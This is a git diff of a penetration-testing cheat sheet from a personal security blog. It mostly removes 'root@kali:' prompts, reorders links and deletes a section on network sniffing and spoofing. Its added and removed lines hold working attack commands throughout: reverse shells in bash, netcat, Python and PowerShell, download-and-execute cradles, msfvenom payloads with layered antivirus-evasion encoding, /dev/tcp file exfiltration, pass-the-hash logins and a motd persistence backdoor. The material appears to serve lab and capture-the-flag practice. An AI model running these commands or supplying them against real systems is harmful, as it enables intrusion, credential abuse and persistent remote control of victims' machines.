@@ -1,10 +1,10 @@
 [**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
 
-[//]: # (# -- 5 spaces before)
-[//]: # (## -- 4 spaces before)
-[//]: # (### -- 3 spaces before)
-[//]: # (#### -- 2 spaces before)
-[//]: # (##### -- 1 space before)
+[//]: # (# -- 5 spaces)
+[//]: # (## -- 4 spaces)
+[//]: # (### -- 3 spaces)
+[//]: # (#### -- 2 spaces)
+[//]: # (##### -- 1 space)
 
 * TOC
 {:toc}
@@ -23,8 +23,8 @@
 ## Bash
 
 ```
-root@kali:$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
-root@kali:$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
+$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 ```
 
 
@@ -33,7 +33,7 @@ root@kali:$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT
 ## Netcat
 
 ```
-root@kali:$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
+$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
 ```
 
 
@@ -46,8 +46,8 @@ root@kali:$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
 ### IPv4
 
 ```
-root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
-root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
+$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
 ```
 
 
@@ -55,8 +55,8 @@ root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socke
 ### IPv6
 
 ```
-root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
-root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
+$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
 ```
 
 
@@ -66,21 +66,21 @@ root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,sock
 
 Invoke-Expression (UTF-16LE):
 
+1. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
 ```
-root@kali:$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
+$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
 PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
 ```
 
-1. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
-
 Invoke-WebRequest + `nc.exe` **[1]**:
+
+1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
 
 ```
 PS > powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
 PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 ```
-
-1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
 
 System.Net.Sockets.TCPClient:
 
@@ -90,12 +90,13 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream =
 
 
 
+
 ## Meterpreter
 
 PowerShell + msfvenom:
 
 ```
-root@kali:$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
 PS > (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
 ...start metasploit listener...
 PS > Start-Process "$env:TEMP\met.exe"
@@ -103,14 +104,14 @@ PS > Start-Process "$env:TEMP\met.exe"
 
 PowerShell + unicorn **[1]**:
 
+1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
+
 ```
-root@kali:$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
-root@kali:$ service postgresql start
-root@kali:$ msfconsole -r unicorn.rc
+$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
+$ service postgresql start
+$ msfconsole -r unicorn.rc
 PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_attack.txt')
 ```
-
-1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
 
 
@@ -118,7 +119,7 @@ PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_a
 ## Listeners
 
 ```
-root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
+$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 ```
 
 
@@ -133,6 +134,8 @@ root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 
 ## Upgrade to PTY
 
+* [forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
+* [xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
 * [securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/](https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/)
 
 ```
@@ -148,18 +151,15 @@ root@kali:$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
 
 root@kali:$ stty raw -echo; fg
 
-(?) user@remote:$ reset
+(opt) user@remote:$ reset
 
 user@remote:$ stty rows ${ROWS} cols ${COLS}
 
 user@remote:$ export TERM=xterm
 (or xterm-color or xterm-256color)
 
-(?) user@remote:$ exec /bin/bash [-l]
+(opt) user@remote:$ exec /bin/bash [-l]
 ```
-
-1. [forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
-2. [xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
 
 
 
@@ -237,7 +237,7 @@ www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
 Full base64 file transfer from Linux to Windows:
 
 ```
-root@kali:$ base64 -w0 tunnel.aspx; echo
+$ base64 -w0 tunnel.aspx; echo
 ...BASE64_CONTENTS...
 PS > Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
 PS > $data = Get-Content -Raw tunnel.b64
@@ -254,7 +254,7 @@ PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert
 SMB server (communicate with Windows **[1]**):
 
 ```
-root@kali:$ smbserver.py -smb2support files `pwd`
+$ smbserver.py -smb2support files `pwd`
 ```
 
 1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
@@ -262,7 +262,7 @@ root@kali:$ smbserver.py -smb2support files `pwd`
 Mount SMB in Windows with `net use`:
 
 ```
-root@kali:$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > net use Z: \\10.10.14.16\share
 PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 ```
@@ -270,7 +270,7 @@ PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 Mount SMB in Windows with `New-PSDrive`:
 
 ```
-root@kali:$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
 Or
@@ -310,160 +310,12 @@ Cmd > ftp -v -n -s:ftp.txt
 
 
 
-# Network attacks
-
-
-
-
-## Sniff Traffic
-
-
-
-### tcpdump
-
-While connected via SSH:
-
-```
-$ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
-```
-
-
-
-### Wireshark
-
-* [research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
-
-
-
-
-## LLMNR/NBNS Poisoning
-
-
-
-### Responder
-
-* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
-* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)
-* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
-* [markclayton.github.io/where-are-my-hashes-responder-observations.html](https://markclayton.github.io/where-are-my-hashes-responder-observations.html)
-
-```
-$ git clone https://github.com/lgandx/Responder
-$ sudo ./Responder.py -I eth0 -wfrd -P -v
-...
-$ head -n 1 logs/*.txt | grep -v -e logs -e '^$'
-```
-
-
-
-### Inveigh
-
-* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-
-```
-$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
-PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
-```
-
-
-#### InveighZero
-
-* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
-* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
-
-```
-$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
-PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
-```
-
-
-
-
-## ARP Spoofing
-
-Enable IP forwarding:
-
-```
-$ sudo sysctl -w net.ipv4.ip_forward=1
-(sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')
-(edit /etc/sysctl.conf "net.ipv4.ip_forward = 1" to make it permanent)
-```
-
-
-
-### dsniff [arpspoof]
-
-* [github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)
-
-Install:
-
-```
-$ sudo apt install dsniff -y
-```
-
-Fire up the attack with Wireshark (filter `ip.src == VICTIM_10.0.0.5`) running:
-
-```
-$ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
-```
-
-
-
-### bettercap
-
-* [github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
-* [www.bettercap.org/modules/](https://www.bettercap.org/modules/)
-* [linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/](https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/)
-* [hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy)
-* [www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets)
-
-Deb dependencies (Ubuntu 18.04 LTS):
-
-* [libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
-* [libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
-* [libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
-* [pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
-* [libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
-* [libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
-* [libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
-
-
-
-
-## DHCPv6 Spoofing
-
-
-
-### mitm6
-
-* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
-* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
-* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
-
-Install:
-
-```
-$ git clone https://github.com/fox-it/mitm6 ~/tools/mitm6 && cd ~/tools/mitm6
-$ python3 setup.py install
-```
-
-Run:
-
-```
-$ sudo smbserver.py -smb2support share `pwd`
-$ sudo mitm6.py -i eth0 -d megacorp.local --ignore-nofqdn
-```
-
-
-
-
-
 # VNC
 
 Decrypt TightVNC password:
 
 ```
-root@kali:$ msdbrun -q
+$ msdbrun -q
 msf > irb
 >> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
@@ -489,7 +341,7 @@ msf > irb
 Mount:
 
 ```
-root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd!']
+$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd!']
 ```
 
 Status:
@@ -513,14 +365,14 @@ root@kali:~# umount /mnt/smb
 Null authentication:
 
 ```
-root@kali:$ smbclient -N -L 127.0.0.1
-root@kali:$ smbclient -N '\\127.0.0.1\Data'
+$ smbclient -N -L 127.0.0.1
+$ smbclient -N '\\127.0.0.1\Data'
 ```
 
 With user creds:
 
 ```
-root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
+$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
 ```
 
 
@@ -531,8 +383,8 @@ root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
 Null authentication:
 
 ```
-root@kali:$ smbmap -H 127.0.0.1 -u anonymous -R
-root@kali:$ smbmap -H 127.0.0.1 -u null -p "" -R
+$ smbmap -H 127.0.0.1 -u anonymous -R
+$ smbmap -H 127.0.0.1 -u null -p "" -R
 ```
 
 
@@ -542,8 +394,8 @@ root@kali:$ smbmap -H 127.0.0.1 -u null -p "" -R
 # NFS
 
 ```
-root@kali:$ showmount -e 127.0.0.1
-root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
+$ showmount -e 127.0.0.1
+$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
 ```
 
 * [resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
@@ -835,7 +687,7 @@ PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\termin
 
 
 
-## runas /netonly
+## runas
 
 ```
 PS > runas /netonly /user:snovvcrash powershell
@@ -880,11 +732,12 @@ $ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 * [www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
 
 
+
 ### psexec.py
 
 ```
-root@kali:$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
-root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
 
@@ -899,8 +752,8 @@ root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0
 ### wmiexec.py
 
 ```
-root@kali:$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
-root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
 
@@ -1210,7 +1063,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
 Compile on Kali:
 
 ```
-root@kali:$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
+$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
 ```
 
 
@@ -1278,8 +1131,8 @@ PS > Bypass-UAC
 ## msfvenom
 
 ```
-root@kali:$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f exe -o rev.exe
-root@kali:$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 9 -f raw | msfvenom --platform windows -a x86 -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -k -f exe -o met.exe
+$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f exe -o rev.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 9 -f raw | msfvenom --platform windows -a x86 -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -k -f exe -o met.exe
 ```
 
 
@@ -1290,8 +1143,8 @@ root@kali:$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=13
 Hyperion + Pescramble
 
 ```
-root@kali:$ wine hyperion.exe input.exe output.exe
-root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
+$ wine hyperion.exe input.exe output.exe
+$ wine PEScrambler.exe -i input.exe -o output.exe
 ```
 
 
@@ -1302,14 +1155,14 @@ root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
 Install and generate a payload:
 
 ```
-root@kali:$ git clone https://github.com/GreatSCT/GreatSCT ~/tools/GreatSCT
-root@kali:$ cd ~/tools/GreatSCT/setup
-root@kali:$ ./setup.sh
-root@kali:$ cd .. && ./GreatSCT.py
+$ git clone https://github.com/GreatSCT/GreatSCT ~/tools/GreatSCT
+$ cd ~/tools/GreatSCT/setup
+$ ./setup.sh
+$ cd .. && ./GreatSCT.py
 ...generate a payload...
-root@kali:$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}
+$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}
 
-root@kali:$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
+$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
 ```
 
 Exec with `msbuild.exe` and get a shell:
@@ -1417,8 +1270,8 @@ PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.
 2. [www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)
 
 ```
-root@kali:$ gem install pry-byebug
-root@kali:$ vi ~/.pry-byebug
+$ gem install pry-byebug
+$ vi ~/.pry-byebug
 ...
 ```
 
@@ -1438,12 +1291,12 @@ end
 
 ```
 ...
-root@kali:$ cp -r /usr/share/metasploit-framework/ /opt
-root@kali:$ vi /opt/metasploit-framework/msfconsole
+$ cp -r /usr/share/metasploit-framework/ /opt
+$ vi /opt/metasploit-framework/msfconsole
 ...add "require 'pry-byebug'"...
-root@kali:$ mkdir -p ~/.msf4/modules/exploits/linux/http/
-root@kali:$ cp /usr/share/metasploit-framework/modules/exploits/linux/http/packageup.rb ~/.msf4/modules/exploits/linux/http/p.rb
-root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
+$ mkdir -p ~/.msf4/modules/exploits/linux/http/
+$ cp /usr/share/metasploit-framework/modules/exploits/linux/http/packageup.rb ~/.msf4/modules/exploits/linux/http/p.rb
+$ vi ~/.msf4/modules/exploits/linux/http/p.rb
 ...add "binding.pry"...
 ```
 
@@ -1482,14 +1335,14 @@ site:example.com ext:(php | asp | aspx)
 dig:
 
 ```
-root@kali:$ dig $(dig -x 127.0.0.1 | grep PTR | tail -n 1 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').origin.asn.cymru.com TXT +short
+$ dig $(dig -x 127.0.0.1 | grep PTR | tail -n 1 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').origin.asn.cymru.com TXT +short
 ```
 
 whois:
 
 ```
-root@kali:$ whois -h whois.cymru.com -- '-v 127.0.0.1'
-root@kali:$ whois -h whois.radb.net 127.0.0.1
+$ whois -h whois.cymru.com -- '-v 127.0.0.1'
+$ whois -h whois.radb.net 127.0.0.1
 ```
 
 
@@ -1499,8 +1352,8 @@ root@kali:$ whois -h whois.radb.net 127.0.0.1
 whois:
 
 ```
-root@kali:$ whois -h whois.cymru.com -- '-v AS48666'
-root@kali:$ whois -h whois.radb.net AS48666
+$ whois -h whois.cymru.com -- '-v AS48666'
+$ whois -h whois.radb.net AS48666
 ```
 
 
@@ -1515,7 +1368,7 @@ root@kali:$ whois -h whois.radb.net AS48666
 IP/domain info, IP ranges:
 
 ```
-root@kali:$ whois [-h whois.example.com] example.com или 127.0.0.1
+$ whois [-h whois.example.com] example.com или 127.0.0.1
 ```
 
 
@@ -1525,8 +1378,8 @@ root@kali:$ whois [-h whois.example.com] example.com или 127.0.0.1
 General:
 
 ```
-root@kali:$ dig [@dns.example.com] example.com [{any,a,mx,ns,soa,txt,...}]
-root@kali:$ dig -x example.com [+short] [+timeout=1]
+$ dig [@dns.example.com] example.com [{any,a,mx,ns,soa,txt,...}]
+$ dig -x example.com [+short] [+timeout=1]
 ```
 
 * [viewdns.info/reverseip/](https://viewdns.info/reverseip/)
@@ -1534,7 +1387,7 @@ root@kali:$ dig -x example.com [+short] [+timeout=1]
 Zone transfer:
 
 ```
-root@kali:$ dig axfr @dns.example.com example.com
+$ dig axfr @dns.example.com example.com
 ```
 
 
@@ -1542,14 +1395,14 @@ root@kali:$ dig axfr @dns.example.com example.com
 ### nslookup
 
 ```
-root@kali:$ nslookup example.com (или 127.0.0.1 для PTR)
+$ nslookup example.com (или 127.0.0.1 для PTR)
 
-root@kali:$ nslookup
+$ nslookup
 [> server dns.example.com]
 > set q=mx
 > example.com
 
-root@kali:$ nslookup
+$ nslookup
 > set q=ptr
 > 127.0.0.1
 ```
@@ -1723,14 +1576,14 @@ $ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 Reverse local port 1111 (on Victim) to local port 2222 (on Attacker):
 
 ```
-root@kali:$ wget [1/linux]
-root@kali:$ gunzip chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel
+$ wget [1/linux]
+$ gunzip chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel
 
-root@kali:$ wget [1/windows]
-root@kali:$ gunzip chisel*.exe.gz && rm chisel*.exe.gz && mv chisel*.exe chisel.exe && upx chisel.exe
-root@kali:$ md5sum chisel.exe
+$ wget [1/windows]
+$ gunzip chisel*.exe.gz && rm chisel*.exe.gz && mv chisel*.exe chisel.exe && upx chisel.exe
+$ md5sum chisel.exe
 
-root@kali:$ ./chisel server -p 8000 -v --reverse
+$ ./chisel server -p 8000 -v --reverse
 
 PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS > get-filehash -alg md5 chisel.exe
@@ -1921,8 +1774,8 @@ $ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
 `/etc/update-motd.d/`:
 
 ```
-root@kali:$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
-root@kali:$ echo '<BASE64_SHELL>' >> 00-header
+$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
+$ echo '<BASE64_SHELL>' >> 00-header
 * Fire up new SSH session and catch the reverse shell
 ```
 
@@ -1953,8 +1806,8 @@ PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShel
 winPEAS:
 
 ```
-root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
-root@kali:$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
+$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
+$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
 PS > (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
 ```
 
@@ -1983,8 +1836,7 @@ PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megac
 Sherlock.ps1:
 
 ```
-root@kali:$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
-powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
+$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
 PS > powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
 ```
 
@@ -1995,7 +1847,7 @@ Watson:
 JAWS:
 
 ```
-root@kali:$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
+$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
 PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
 PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 ```
@@ -2068,7 +1920,7 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 ```
 Cmd > certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
 Cmd > certutil -urlcache -split -f http://127.0.0.1/rev.bat C:\Windows\System32\spool\drivers\color\rev.bat
-root@kali:$ nc -lvnp 443
+$ nc -lvnp 443
